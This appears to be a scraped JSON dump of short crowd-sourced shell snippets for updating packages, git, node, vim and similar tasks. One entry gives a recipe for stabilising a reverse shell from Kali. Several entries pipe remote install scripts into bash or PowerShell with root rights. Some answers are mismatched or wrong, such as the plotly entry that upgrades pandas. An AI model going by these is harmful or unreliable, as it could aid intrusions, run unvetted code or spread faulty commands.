    "description": "nvm install-latest-npm\nnvm install latest\n// to see which versions of node you have run: nvm ls  // example: // nvm ls //         v8.10.0 // ->      v8.16.0 //       v10.21.0 //         system // default -> 8.16.0 (-> v8.16.0)  // in this case use nvm use 10.21.0  // you can also uninstall and reinstall if you are having issues // by following the steps in: // https://stackabuse.com/how-to-uninstall-node-js-from-mac-osx/\n",
    "reg_date": "2021-10-11T22:13:04.000Z"
  },
  {
    "id": 4861,
    "keyword": null,
    "link": null,
    "title": " update package archlinux",
    "description": "sudo pacman -Syu\n",
    "reg_date": "2021-10-11T22:13:04.000Z"
  },
  {
    "id": 4862,
    "keyword": null,
    "link": null,
    "title": " update package repository arch",
    "description": "sudo pacman -Syy\n",
    "reg_date": "2021-10-11T22:13:05.000Z"
  },
  {
    "id": 4863,
    "keyword": null,
    "link": null,
    "title": " update r packages from anaconda",
    "description": "conda update r-caret #Update all r packages and their dependencies with one command\n",
    "reg_date": "2021-10-11T22:13:05.000Z"
  },
  {
    "id": 4864,
    "keyword": null,
    "link": null,
    "title": " update raspi",
    "description": "sudo apt update && sudo apt full-upgrade\nsudo apt-get update && sudo apt-get upgrade\n",
    "reg_date": "2021-10-11T22:13:05.000Z"
  },
  {
    "id": 4865,
    "keyword": null,
    "link": null,
    "title": " update repository ubuntu",
    "description": "//Debian GNU/Linux and chromebook linux sudo apt install software-properties-common\nsudo nano /etc/apt/sources.list\n",
    "reg_date": "2021-10-11T22:13:05.000Z"
  },
  {
    "id": 4866,
    "keyword": null,
    "link": null,
    "title": " update sdk mint",
    "description": "sudo snap install androidsdk\n",
    "reg_date": "2021-10-11T22:13:05.000Z"
  },
  {
    "id": 4867,
    "keyword": null,
    "link": null,
    "title": " update software in ubuntu",
    "description": "sudo apt update && sudo apt upgrade -y #or use it seperately sudo apt update sudo apt upgrade #you make wanna run below command to remove unwanted #and free up some space sudo apt autoremove\n# \"To update Linux type:\" sudo apt-get update # Enter your user's password.\n# Upgrades all applications sudo apt-get upgrade \n",
    "reg_date": "2021-10-11T22:13:05.000Z"
  },
  {
    "id": 4868,
    "keyword": null,
    "link": null,
    "title": " update system ubuntu",
    "description": "sudo apt update && sudo apt upgrade -y\n",
    "reg_date": "2021-10-11T22:13:05.000Z"
  },
  {
    "id": 4869,
    "keyword": null,
    "link": null,
    "title": " update to wsl2",
    "description": "#enable wsl  dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart #make sure windows version is >=2004 dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart #restart wsl --set-default-version 2 #if kernal error https://docs.microsoft.com/en-us/windows/wsl/wsl2-kernel \n",
    "reg_date": "2021-10-11T22:13:05.000Z"
  },
  {
    "id": 4870,
    "keyword": null,
    "link": null,
    "title": " update ubuntu",
    "description": "sudo apt update && sudo apt upgrade -y #or use it seperately sudo apt update sudo apt upgrade #you make wanna run below command to remove unwanted #and free up some space sudo apt autoremove\nsudo apt update && sudo apt upgrade -y\n# \"To update Linux type:\" sudo apt-get update # Enter your user's password.\n# Upgrades all applications sudo apt-get upgrade \nsudo -s -- <<EOF apt-get update apt-get upgrade -y apt-get dist-upgrade -y apt-get autoremove -y apt-get autoclean -y EOF \nsudo -- sh -c 'apt-get update; apt-get upgrade -y; apt-get dist-upgrade -y; apt-get autoremove -y; apt-get autoclean -y' \n",
    "reg_date": "2021-10-11T22:13:05.000Z"
  },
  {
    "id": 4871,
    "keyword": null,
    "link": null,
    "title": " update vs code in ubuntu",
    "description": "sudo add-apt-repository -y \"deb https://packages.microsoft.com/repos/vscode stable main \" sudo apt update sudo apt -y install code\nwget https://vscode-update.azurewebsites.net/latest/linux-deb-x64/stable -O /tmp/code_latest_amd64.deb sudo dpkg -i /tmp/code_latest_amd64.deb \nwget 'https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64' -O /tmp/code_latest_amd64.deb sudo dpkg -i /tmp/code_latest_amd64.deb \n",
    "reg_date": "2021-10-11T22:13:06.000Z"
  },
  {
    "id": 4872,
    "keyword": null,
    "link": null,
    "title": " update vscode through terminal",
    "description": "wget https://vscode-update.azurewebsites.net/latest/linux-deb-x64/stable -O /tmp/code_latest_amd64.deb sudo dpkg -i /tmp/code_latest_amd64.deb \nsudo apt-get update sudo apt-get install code  \n",
    "reg_date": "2021-10-11T22:13:06.000Z"
  },
  {
    "id": 4873,
    "keyword": null,
    "link": null,
    "title": " update zsh ubuntu",
    "description": "omz update\n",
    "reg_date": "2021-10-11T22:13:06.000Z"
  },
  {
    "id": 4874,
    "keyword": null,
    "link": null,
    "title": " updated gitignore not working",
    "description": "git rm -r --cached . git add . git commit -m \"fixed untracked files\"\n",
    "reg_date": "2021-10-11T22:13:06.000Z"
  },
  {
    "id": 4875,
    "keyword": null,
    "link": null,
    "title": " updating git",
    "description": "C:\\> git update-git-for-windows\ngit update-git-for-windows\nbrew upgrade git\nC:\\> git update-git-for-windows \n# For windows use git update-git-for-windows # else I guess? git update\nFirst, navigate to the desired directory:  $ cd ~/Documents/GitHub/DI-NEON-participants  And then type:  $ git remote add upstream https://github.com/NEONS...  Update local repo using git pull with the added directions of  upstream indicating the central repository and master specifying  which branch you are pulling down:  $ git pull upstream master\n",
    "reg_date": "2021-10-11T22:13:06.000Z"
  },
  {
    "id": 4876,
    "keyword": null,
    "link": null,
    "title": " updating linux",
    "description": "# \"To update Linux type:\" sudo apt-get update  # To upgrade Linux sudo apt upgrade  # For Both sudo apt update && sudo apt upgrade -y\nsudo apt-get update && sudo apt-get upgrade\n# \"To update Linux type:\" sudo apt-get update # Enter your user's password.\n#gets package(s) update definitions sudo apt update #upgrades the package(s) for which update definitions are received sudo apt upgrade \nsudo do-release-upgrade\n",
    "reg_date": "2021-10-11T22:13:06.000Z"
  },
  {
    "id": 4877,
    "keyword": null,
    "link": null,
    "title": " updating to gulp 4",
    "description": "Updating to Gulp 4 Brian Muenzenmeyer edited this page on 17 Sep 2017 &middot; 4 revisions Gulp 4 uses an updated CLI which needs to be updated globally. This CLI is backwards compatible with any Gulp 3.X projects you may have locally.  # first uninstall gulp globally npm uninstall gulp -g  # uninstall from your project directory, or delete node_modules if you need a coffee break npm uninstall gulp  # install the latest Gulp 4 CLI tools globally npm install gulpjs/gulp-cli -g\n",
    "reg_date": "2021-10-11T22:13:06.000Z"
  },
  {
    "id": 4878,
    "keyword": null,
    "link": null,
    "title": " upgrade all packages in package.json",
    "description": "npm install -g npm-check-updates ncu -u npm install\nnpm install -g npm-check-updates ncu -u npm update npm install\nnpm install -g npm-check-updates /after install run following: ncu -u  //Then this: npm update\nnpm i -g npm-check-updates ncu -u npm install \n$ npm install -g npm-check-updates $ ncu -u $ npm install \n",
    "reg_date": "2021-10-11T22:13:06.000Z"
  },
  {
    "id": 4879,
    "keyword": null,
    "link": null,
    "title": " upgrade capacitor",
    "description": "npm install @capacitor/cli@latest @capacitor/core@latest\nnpm install @capacitor/app @capacitor/haptics @capacitor/keyboard @capacitor/status-bar\n",
    "reg_date": "2021-10-11T22:13:07.000Z"
  },
  {
    "id": 4880,
    "keyword": null,
    "link": null,
    "title": " upgrade chocolatey",
    "description": "chocolatey upgrade chocolatey\n",
    "reg_date": "2021-10-11T22:13:07.000Z"
  },
  {
    "id": 4881,
    "keyword": null,
    "link": null,
    "title": " upgrade command magento 2",
    "description": "php bin\\magento setup:upgrade\n",
    "reg_date": "2021-10-11T22:13:07.000Z"
  },
  {
    "id": 4882,
    "keyword": null,
    "link": null,
    "title": " upgrade composer version",
    "description": "composer self-update \nphp composer.phar update\nrun which composer (output /usr/bin/composer) run php -r \"copy('https://getcomposer.org/installer', 'composer-setup.php');\" run sudo php composer-setup.php --install-dir=/usr/bin --filename=composer\nphp7.3 -f /usr/local/bin/composer update\n To update composer command just find location of composer.phar and update as:  where composer \t#Retrieves you location of your composer.phar  cd path_to_composer.phar #Move to directory with composer.phar  php composer.phar self-update\t#Update your composer\n",
    "reg_date": "2021-10-11T22:13:07.000Z"
  },
  {
    "id": 4883,
    "keyword": null,
    "link": null,
    "title": " upgrade dart in flutter",
    "description": "flutter upgrade\nC:\\> choco upgrade dart-sdk \n$ flutter channel \n$ flutter upgrade  Flutter 0.5.1 &bull; channel beta &bull; https://github.com/flutter/flutter.git Framework &bull; revision c7ea3ca377 (9 weeks ago) &bull; 2018-05-29 21:07:33 +0200 Engine &bull; revision 1ed25ca7b7 Tools &bull; Dart 2.0.0-dev.58.0.flutter-f981f09760 \n",
    "reg_date": "2021-10-11T22:13:07.000Z"
  },
  {
    "id": 4884,
    "keyword": null,
    "link": null,
    "title": " upgrade django",
    "description": "$ python -m pip install -U Django\npip install --upgrade django==1.6.5\npython -m pip install -U Django\n",
    "reg_date": "2021-10-11T22:13:07.000Z"
  },
  {
    "id": 4885,
    "keyword": null,
    "link": null,
    "title": " upgrade git on centos 7",
    "description": "sudo yum install epel-release sudo yum remove git sudo yum install git\n",
    "reg_date": "2021-10-11T22:13:07.000Z"
  },
  {
    "id": 4886,
    "keyword": null,
    "link": null,
    "title": " upgrade node",
    "description": "curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - sudo apt-get install -y nodejs\nsudo npm install npm@latest -g\n//First, clear the npm cache: \tnpm cache clean -f  //Install n, Node&rsquo;s version manager: \tnpm install -g n      //With the n module installed, you can use it to: \tInstall the latest stable version: n stable \tInstall the latest release: n latest\n//check node version >node -v // let's install a program called n that will let us easily switch  //between Node versions. >npm install -g n //Upgrading to the latest stable version >n stable  //Changing to a specific version >n 10.16.0 \n# Using Ubuntu curl -sL https://deb.nodesource.com/setup_13.x | sudo -E bash - sudo apt-get install -y nodejs  # Using Debian, as root curl -sL https://deb.nodesource.com/setup_13.x | bash - apt-get install -y nodejs \n# win choco upgrade nodejs\n",
    "reg_date": "2021-10-11T22:13:07.000Z"
  },
  {
    "id": 4887,
    "keyword": null,
    "link": null,
    "title": " upgrade node ubuntu",
    "description": "curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - sudo apt-get install -y nodejs\nsudo npm cache clean -f sudo npm install -g n sudo n stable\n# Using Ubuntu curl -sL https://deb.nodesource.com/setup_13.x | sudo -E bash - sudo apt-get install -y nodejs  # Using Debian, as root curl -sL https://deb.nodesource.com/setup_13.x | bash - apt-get install -y nodejs \nsudo npm cache clean -f sudo npm install -g n sudo n stable \n# Using Ubuntu curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - sudo apt-get install -y nodejs  # Using Debian, as root curl -sL https://deb.nodesource.com/setup_12.x | bash - apt-get install -y nodejs \nnvm use <version>\n",
    "reg_date": "2021-10-11T22:13:08.000Z"
  },
  {
    "id": 4888,
    "keyword": null,
    "link": null,
    "title": " upgrade npm",
    "description": "// update npm// npm install -g npm@latest \nnpm i -g npm-upgrade\n// update npm// npm install -g npm@latest\nsudo npm install -g npm\nnpm i -g npm@latest\n// update npm to latest version // npm install -g npm@latest\n",
    "reg_date": "2021-10-11T22:13:08.000Z"
  },
  {
    "id": 4889,
    "keyword": null,
    "link": null,
    "title": " upgrade pandas version",
    "description": "pip install pandas --upgrade #or $ python -m pip install -U pandas\n",
    "reg_date": "2021-10-11T22:13:08.000Z"
  },
  {
    "id": 4890,
    "keyword": null,
    "link": null,
    "title": " upgrade pgadmin 4 to ubuntu 18.04",
    "description": "# # Setup the repository #  # Install the public key for the repository (if not done previously): sudo curl https://www.pgadmin.org/static/packages_pgadmin_org.pub | sudo apt-key add  # Create the repository configuration file: sudo sh -c 'echo \"deb https://ftp.postgresql.org/pub/pgadmin/pgadmin4/apt/$(lsb_release -cs) pgadmin4 main\" > /etc/apt/sources.list.d/pgadmin4.list && apt update'  # # Install pgAdmin #  # Install for both desktop and web modes: sudo apt install pgadmin4  # Install for desktop mode only: sudo apt install pgadmin4-desktop  # Install for web mode only:  sudo apt install pgadmin4-web   # Configure the webserver, if you installed pgadmin4-web: sudo /usr/pgadmin4/bin/setup-web.sh\n",
    "reg_date": "2021-10-11T22:13:08.000Z"
  },
  {
    "id": 4891,
    "keyword": null,
    "link": null,
    "title": " upgrade plotly version",
    "description": "pip install plotly --upgrade # or $ python -m pip install -U pandas\n",
    "reg_date": "2021-10-11T22:13:08.000Z"
  },
  {
    "id": 4892,
    "keyword": null,
    "link": null,
    "title": " upgrade powershell to 7.1.1 command line",
    "description": "iex \"& { $(irm https://aka.ms/install-powershell.ps1) } -UseMSI\"\n",
    "reg_date": "2021-10-11T22:13:08.000Z"
  },
  {
    "id": 4893,
    "keyword": null,
    "link": null,
    "title": " upgrade shell tty",
    "description": "python -c 'import pty; pty.spawn(\"/bin/bash\")' \nstty raw -echo $ export SHELL=bash $ export TERM=xterm256-color $ stty rows 38 columns 116\n# In reverse shell $ python -c 'import pty; pty.spawn(\"/bin/bash\")' Ctrl-Z  # In Kali $ stty raw -echo $ fg  # In reverse shell $ reset $ export SHELL=bash $ export TERM=xterm-256color $ stty rows <num> columns <cols> \n",
    "reg_date": "2021-10-11T22:13:08.000Z"
  },
  {
    "id": 4894,
    "keyword": null,
    "link": null,
    "title": " upgrade terraform",
    "description": "brew install terraform\n",
    "reg_date": "2021-10-11T22:13:08.000Z"
  },
  {
    "id": 4895,
    "keyword": null,
    "link": null,
    "title": " upgrade ubuntu",
    "description": "sudo apt update && sudo apt upgrade -y #or use it seperately sudo apt update sudo apt upgrade #you make wanna run below command to remove unwanted #and free up some space sudo apt autoremove\necho \"sudo apt update && sudo apt -y upgrade && sudo apt -y dist-upgrade && sudo apt -y autoremove && sudo apt autoclean\" > update && sudo mv update /usr/local/bin/update && sudo chmod +x /usr/local/bin/update \nsudo apt update && sudo apt upgrade -y\n# Upgrades all applications sudo apt-get upgrade \nsudo -s -- <<EOF apt-get update apt-get upgrade -y apt-get dist-upgrade -y apt-get autoremove -y apt-get autoclean -y EOF \nsudo -- sh -c 'apt-get update; apt-get upgrade -y; apt-get dist-upgrade -y; apt-get autoremove -y; apt-get autoclean -y' \n",
    "reg_date": "2021-10-11T22:13:08.000Z"
  },
  {
    "id": 4896,
    "keyword": null,
    "link": null,
    "title": " upgrade ubuntu 16.04 to 20.04",
    "description": "sudo apt update && sudo apt upgrade  sudo do-release-upgrade\n",
    "reg_date": "2021-10-11T22:13:09.000Z"
  },
  {
    "id": 4897,
    "keyword": null,
    "link": null,
    "title": " upgrading composer globally on windows",
    "description": "php composer.phar self-update\nexport PATH=~/.composer/vendor/bin:$PATH\n",
    "reg_date": "2021-10-11T22:13:09.000Z"
  },
  {
    "id": 4898,
    "keyword": null,
    "link": null,
    "title": " upgrading ionic 5",
    "description": "npm install @ionic/angular@latest @ionic/angular-toolkit@latest --save\n",
    "reg_date": "2021-10-11T22:13:09.000Z"
  },
  {
    "id": 4899,
    "keyword": null,
    "link": null,
    "title": " upload new repo to git",
    "description": "git init git add somefile git commit -m \"initial commit\" git remote add origin https://github.com/username/new_repo git push -u origin master \nOpen Terminal. Change the current working directory to your local project. Initialize the local directory as a Git repository. $ git init Add the files in your new local repository. This stages them for the first commit. $ git add . # Adds the files in the local repository and stages them for commit. To unstage a file, use 'git reset HEAD YOUR-FILE'. Commit the files that you've staged in your local repository. $ git commit -m \"First commit\" # Commits the tracked changes and prepares them to be pushed to a remote repository. To remove this commit and modify the file, use 'git reset --soft HEAD~1' and commit and add the file again. At the top of your GitHub repository's Quick Setup page, click  to copy the remote repository URL. Copy remote repository URL field In Terminal, add the URL for the remote repository where your local repository will be pushed. $ git remote add origin remote repository URL # Sets the new remote $ git remote -v # Verifies the new remote URL Push the changes in your local repository to GitHub. $ git push -u origin master # Pushes the changes in your local repository up to the remote repository you specif\n# New local repository git init git add . git commit -m \"Initial commit\"  # New remote repository git remote add origin git@github.com:username/new_repo #ssh # Now push git push -u origin master\necho \"# Can-I-Shop-2\" >> README.md git init git add . git commit -m \"first commit\" git remote add origin https://github.com/username/projectname.git git push -u origin master                 \ngit configuration \n",
    "reg_date": "2021-10-11T22:13:09.000Z"
  },
  {
    "id": 4900,
    "keyword": null,
    "link": null,
    "title": " upload react project to github",
    "description": "Make sure you have already created a repo in github. In \"package.json\" file of project add - \"homepage\": \"https://username.github.io/reponame\" Run Install - \"yarn add gh-pages\" In \"package.json/scripts\" add `\"predeploy\":\"npm run build\", \"deploy\":\"gh-pages -d build\"`  Run \"npm run build\" to create the build To push in git use following steps: 1) git init 2) git add -A 3) git commmit -m \"first commit\" 4) git remote add origin https://github.com/username/reponame.git 5) git push -u origin master Now in github repo create a new branch \"gh-pages\" In settings -> github pages -> source -> branch -> gh-pages -> save Run \"npm run deploy\" *****************************voil&agrave; it's done!!*************************\n$ git remote add origin https://github.com/gitname/react-gh-pages.git \necho \"# instagram-clone\" >> README.md git init git add README.md git commit -m \"first commit\" git branch -M main git remote add origin https://github.com/CoderJakaria/instagram-clone.git git push -u origin main\n",
    "reg_date": "2021-10-11T22:13:09.000Z"
  },
  {
    "id": 4901,
    "keyword": null,
    "link": null,
    "title": " upload with httpie",
    "description": "// The \"keyName\" must be the same the server is expecting http http://address.com/api keyName@myImage.jpg\n",
    "reg_date": "2021-10-11T22:13:10.000Z"
  },
  {
    "id": 4902,
    "keyword": null,
    "link": null,
    "title": " uppercase first str bash",
    "description": "foo=\"bar\" echo \"$(tr '[:lower:]' '[:upper:]' <<< ${foo:0:1})${foo:1}\" #returns 'Bar'\n",
    "reg_date": "2021-10-11T22:13:10.000Z"
  },
  {
    "id": 4903,
    "keyword": null,
    "link": null,
    "title": " usb device not recognized in virtualbox ubuntu",
    "description": "sudo adduser $USER vboxusers  #after restart virtual machine\n",
    "reg_date": "2021-10-11T22:13:10.000Z"
  },
  {
    "id": 4904,
    "keyword": null,
    "link": null,
    "title": " use ntfs usb on mac",
    "description": "/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n",
    "reg_date": "2021-10-11T22:13:10.000Z"
  },
  {
    "id": 4905,
    "keyword": null,
    "link": null,
    "title": " use nvm to install latest node",
    "description": "//lists all versions nvm ls-remote  //installs the version you want (in this case version 14.0.0) nvm install v14.0.0  //use the version that you installed as the default nvm use v14.0.0 \n$ curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.32.1/install.sh | bash\ncurl -sL https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.0/install.sh -o install_nvm.sh \n",
    "reg_date": "2021-10-11T22:13:10.000Z"
  },
  {
    "id": 4906,
    "keyword": null,
    "link": null,
    "title": " use python shell with git bash",
    "description": "winpty python\n",
    "reg_date": "2021-10-11T22:13:10.000Z"
  },
  {
    "id": 4907,
    "keyword": null,
    "link": null,
    "title": " use random to get dice number between 1 to 6 in shell script",
    "description": "$(( ( RANDOM % 10 )  + 1 ))\n$(( ( RANDOM % 5 + 1 ))\n$(( ( RANDOM % 6 ) + 1 ))\n",
    "reg_date": "2021-10-11T22:13:11.000Z"
  },
  {
    "id": 4908,
    "keyword": null,
    "link": null,
    "title": " use ssh key of old server",
    "description": "cp /path/to/my/key/id_rsa ~/.ssh/id_rsa cp /path/to/my/key/id_rsa.pub ~/.ssh/id_rsa.pub # change permissions on file sudo chmod 600 ~/.ssh/id_rsa sudo chmod 600 ~/.ssh/id_rsa.pub # start the ssh-agent in the background eval $(ssh-agent -s) # make ssh agent to actually use copied key ssh-add ~/.ssh/id_rsa\n",
    "reg_date": "2021-10-11T22:13:11.000Z"
  },
  {
    "id": 4909,
    "keyword": null,
    "link": null,
    "title": " use vscode as default file editor for filezilla ubuntu",
    "description": "Just type this is Filezilla Settings->File Editing-> File Association  php /snap/bin/code\n",
    "reg_date": "2021-10-11T22:13:11.000Z"
  },
  {
    "id": 4910,
    "keyword": null,
    "link": null,
    "title": " useful apt commands",
    "description": "$ apt-cache pkgnames\nesseract-ocr-epo pipenightdreams mumudvb tbb-examples libsvm-java libmrpt-hmtslam0.9 libboost-timer1.50-dev kcm-touchpad g++-4.5-multilib ...\n",
    "reg_date": "2021-10-11T22:13:11.000Z"
  },
  {
    "id": 4911,
    "keyword": null,
    "link": null,
    "title": " usermod: group 'sudo' does not exist",
    "description": "usermod - aG wheel username #in centos7\n",
    "reg_date": "2021-10-11T22:13:11.000Z"
  },
  {
    "id": 4912,
    "keyword": null,
    "link": null,
    "title": " usg rtsp conntrack",
    "description": "## To enable RTSP Conntrack in the Unifi USG ##  ## Create directory /config/scripts/pre-config.d ## mkdir /config/scripts/pre-config.d  ## Open and edit the init script ## vi load_nat_rtsp_module.sh  ## Paste the following: ## #!/bin/bash modprobe nf_nat_rtsp  ## Close and save the file (esc + :wq) ## ## Restart the USG OR run the following command to start the service ## sudo modprobe nf_nat_rtsp  ## To check if RTSP is running run the following command ## lsmod | grep rtsp\n",
    "reg_date": "2021-10-11T22:13:11.000Z"
  },
  {
    "id": 4913,
    "keyword": null,
    "link": null,
    "title": " using ffmpeg on mac to record screen",
    "description": "ffmpeg -f avfoundation -i \"2:0\" -vf  \"crop=1024:768:400:800\" -pix_fmt yuv420p -y -r 10 out.mov \n",
    "reg_date": "2021-10-11T22:13:11.000Z"
  },
  {
    "id": 4914,
    "keyword": null,
    "link": null,
    "title": " using home brew install vs code",
    "description": " $ brew cask install visual-studio-code \n",
    "reg_date": "2021-10-11T22:13:11.000Z"
  },
  {
    "id": 4915,
    "keyword": null,
    "link": null,
    "title": " using wget with a proxy",
    "description": "wget -e use_proxy=yes -e http_proxy=$proxy http://askubuntu.com \n",
    "reg_date": "2021-10-11T22:13:12.000Z"
  },
  {
    "id": 4916,
    "keyword": null,
    "link": null,
    "title": " usr/bin/env: ‘node’: No such file or directory",
    "description": "ln -s /usr/bin/nodejs /usr/bin/node\nsudo add-apt-repository https://launchpad.net/~chris-lea/+archive/node.js/  sudo apt-get install -y nodejs\n",
    "reg_date": "2021-10-11T22:13:12.000Z"
  },
  {
    "id": 4917,
    "keyword": null,
    "link": null,
    "title": " utbuntu update",
    "description": "sudo apt update && sudo apt upgrade -y\n",
    "reg_date": "2021-10-11T22:13:12.000Z"
  },
  {
    "id": 4918,
    "keyword": null,
    "link": null,
    "title": " uzip bash: -c: line 0: unexpected EOF while looking for matching `\"'",
    "description": "sudo apt install unzip\n",
    "reg_date": "2021-10-11T22:13:12.000Z"
  },
  {
    "id": 4919,
    "keyword": null,
    "link": null,
    "title": " valet install command not found",
    "description": "export PATH=$PATH:~/.composer/vendor/bin \n",
    "reg_date": "2021-10-11T22:13:12.000Z"
  },
  {
    "id": 4920,
    "keyword": null,
    "link": null,
    "title": " valgrind install ubuntu",
    "description": "sudo apt install valgrind\n",
    "reg_date": "2021-10-11T22:13:12.000Z"
  },
  {
    "id": 4921,
    "keyword": null,
    "link": null,
    "title": " vercel cli",
    "description": "npm i -g vercel\nnpm i -g vercel # or yarn global add vercel # or volta install vercel\n",
    "reg_date": "2021-10-11T22:13:12.000Z"
  },
  {
    "id": 4922,
    "keyword": null,
    "link": null,
    "title": " vercel installation",
    "description": "npm i -g vercel\nnpm i -g vercel # or yarn global add vercel # or volta install vercel\n",
    "reg_date": "2021-10-11T22:13:12.000Z"
  },
  {
    "id": 4923,
    "keyword": null,
    "link": null,
    "title": " verify elementary os iso image",
    "description": "sha256sum elementaryos-6.0-stable.20210831.iso It should produce the output: 60bbaca60d8dbf9f5f112ade2ee5924af976ba01ce19e53e871c8deced7ae884\n",
    "reg_date": "2021-10-11T22:13:13.000Z"
  },
  {
    "id": 4924,
    "keyword": null,
    "link": null,
    "title": " verify parameter one bash",
    "description": "if [ -z \"$1\" ]   then     echo \"No argument supplied\" fi\n",
    "reg_date": "2021-10-11T22:13:13.000Z"
  },
  {
    "id": 4925,
    "keyword": null,
    "link": null,
    "title": " versão do meu linux",
    "description": "// Basta abrir o terminal e digitar o comando abaixo cat /etc/os-release\n",
    "reg_date": "2021-10-11T22:13:13.000Z"
  },
  {
    "id": 4926,
    "keyword": null,
    "link": null,
    "title": " version nginx command",
    "description": "nginx -v\n",
    "reg_date": "2021-10-11T22:13:13.000Z"
  },
  {
    "id": 4927,
    "keyword": null,
    "link": null,
    "title": " vestacp wordpress permissions",
    "description": "// Change $USER and $DOMAIN chown -R $USER:$USER /home/$USER/web/$DOMAIN/public_html/\n",
    "reg_date": "2021-10-11T22:13:13.000Z"
  },
  {
    "id": 4928,
    "keyword": null,
    "link": null,
    "title": " view git branches most recent first",
    "description": "git for-each-ref --sort=-committerdate refs/heads/  # Or using git branch (since version 2.7.0) git branch --sort=-committerdate  # DESC git branch --sort=committerdate  # ASC\n",
    "reg_date": "2021-10-11T22:13:13.000Z"
  },
  {
    "id": 4929,
    "keyword": null,
    "link": null,
    "title": " view git stash without applying",
    "description": "git stash show -p stash@{1} \ngit stash show -p stash@{1}\n",
    "reg_date": "2021-10-11T22:13:14.000Z"
  },
  {
    "id": 4930,
    "keyword": null,
    "link": null,
    "title": " view hex values of file",
    "description": "xxd file \n",
    "reg_date": "2021-10-11T22:13:14.000Z"
  },
  {
    "id": 4931,
    "keyword": null,
    "link": null,
    "title": " view host entires mac terminal",
    "description": "sudo nano /etc/hosts\n",
    "reg_date": "2021-10-11T22:13:14.000Z"
  },
  {
    "id": 4932,
    "keyword": null,
    "link": null,
    "title": " view log apache 2",
    "description": "sudo tail /var/log/apache2/error.log\n",
    "reg_date": "2021-10-11T22:13:14.000Z"
  },
  {
    "id": 4933,
    "keyword": null,
    "link": null,
    "title": " vim comment out mutiple lines",
    "description": "# To comment Press ESC hit V Move the cursor until desired lines to comment hit : '<,'>s/^/#/g  # To uncomment Do the same, but command is: '<,'>s/^#//g  # '<,'> indicates the range you've selected with VISUAL MODE.\n",
    "reg_date": "2021-10-11T22:13:14.000Z"
  },
  {
    "id": 4934,
    "keyword": null,
    "link": null,
    "title": " vim copy paste columns",
    "description": "# Basic syntax: 1. Press ESC to ensure youre in command mode 2. Move to a corner of the text you want to copy (or cut) 3. Press CTRL+v to enter visual block mode 4. Move the cursor Up/Down/Left/Right to highlight the text 5. Press y to yank (copy) the text or d to delete (cut) the text 6. Move to where you want to paste the copied/cut text and press p\n",
    "reg_date": "2021-10-11T22:13:15.000Z"
  },
  {
    "id": 4935,
    "keyword": null,
    "link": null,
    "title": " vim delete line",
    "description": "# Basic syntax: dd  # Note, add a number in from of dd to delete that many lines, e.g.: 5dd # Delete the next 5 lines\nd dd // deletes a line\n:1,$d\n",
    "reg_date": "2021-10-11T22:13:15.000Z"
  },
  {
    "id": 4936,
    "keyword": null,
    "link": null,
    "title": " vim delete to beginning of file",
    "description": "# Basic syntax: dgg\n",
    "reg_date": "2021-10-11T22:13:15.000Z"
  },
  {
    "id": 4937,
    "keyword": null,
    "link": null,
    "title": " vim hangs",
    "description": "Ctrl + q  \nTo unfreeze Vim Press CTRL + q  This happened because you might have accidentally pressed  CTRL + s (Software Control Flow)   XOFF/XON representations in ASCII Code\tMeaning\t               ASCII  Dec\tHex\tKeyboard XOFF\tPause   transmission   DC3\t  19\t13\tCTRL + s XON\t    Resume  transmission   DC1\t  17\t11\tCTRL + q \n",
    "reg_date": "2021-10-11T22:13:15.000Z"
  },
  {
    "id": 4938,
    "keyword": null,
    "link": null,
    "title": " vim plug",
    "description": "# Neovim: sh -c 'curl -fLo \"${XDG_DATA_HOME:-$HOME/.local/share}\"/nvim/site/autoload/plug.vim --create-dirs \\        https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim'         # Vim: curl -fLo ~/.vim/autoload/plug.vim --create-dirs \\     https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\nsh -c 'curl -fLo \"${XDG_DATA_HOME:-$HOME/.local/share}\"/nvim/site/autoload/plug.vim --create-dirs \\        https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim'\n$ curl -fLo ~/.vim/autoload/plug.vim --create-dirs \\   https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\n#unix curl -fLo ~/.vim/autoload/plug.vim --create-dirs \\     https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\n",
    "reg_date": "2021-10-11T22:13:16.000Z"
  },
  {
    "id": 4939,
    "keyword": null,
    "link": null,
    "title": " vim replace last match on every line",
    "description": "# Basic syntax: :%s/.*\\zs<search_pattern>/<replacement>/\n",
    "reg_date": "2021-10-11T22:13:16.000Z"
  },
  {
    "id": 4940,
    "keyword": null,
    "link": null,
    "title": " vim replace multiple lines",
    "description": "# Replace all instances of foo with bar :%s/foo/bar/g  # Replace all instances of foo in lines 6 to 10 inclusive with bar :6,10s/foo/bar/g\nMove the cursor to the appropriate location. Enter 'VISUAL BLOCK' mode (Ctrl v). Use your directional keys to select required number of lines (j or k). Press I (capital i). Press Esc.  Note: Once exited out of 'VISUAL BLOCK' mode, changes will take effect.\n",
    "reg_date": "2021-10-11T22:13:16.000Z"
  },
  {
    "id": 4941,
    "keyword": null,
    "link": null,
    "title": " vim replace tabs with spaces",
    "description": "\" Vi:  \" To replace tabs with spaces whilst typing set tabstop=4 shiftwidth=4 expandtab\n# Basic syntax using regex: import re re.sub('characters_to_pad', r' \\1 ', string_of_characters) # Where you can specify which punctuation characters you want to pad in #\tcharacters_to_pad  # Example usage: import re your_string = 'bla. bla? bla.bla! bla...' # An intelligent sentence your_string = re.sub('([.,!()])', r' \\1 ', your_string) # your_string is updated in place print(your_string) --> bla .  bla? bla . bla !  bla .  .  .  # Notice that the '?' didn't have spaces added because it wasn't listed #\tamong the characters_to_pad in the above function\n",
    "reg_date": "2021-10-11T22:13:17.000Z"
  },
  {
    "id": 4942,
    "keyword": null,
    "link": null,
    "title": " vim set tab size",
